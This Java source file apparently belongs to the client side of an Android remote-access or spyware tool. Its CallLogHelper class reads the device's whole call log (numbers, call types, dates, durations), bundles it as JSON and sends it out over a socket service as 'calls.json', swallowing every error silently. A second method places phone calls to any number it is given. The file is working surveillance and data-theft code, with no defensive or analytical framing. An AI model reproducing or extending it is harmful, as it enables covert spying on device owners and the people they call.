package com.rainbow.client;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.provider.CallLog;
import android.database.Cursor;
import org.json.JSONArray;
import org.json.JSONObject;

public class CallLogHelper {
    public static void dump(Context ctx) {
        try {
            JSONArray arr = new JSONArray();
            Cursor c = ctx.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
            if (c != null) {
                while (c.moveToNext()) {
                    JSONObject o = new JSONObject();
                    o.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    o.put("type", c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    o.put("date", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    o.put("duration", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    arr.put(o);
                }
                c.close();
            }
            SocketService2.sendFile("calls.json", arr.toString().getBytes());
        } catch (Exception ignored) {}
    }

    public static void call(Context ctx, String number) {
        try {
            Intent i = new Intent(Intent.ACTION_CALL);
            i.setData(Uri.parse("tel:" + number));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }
}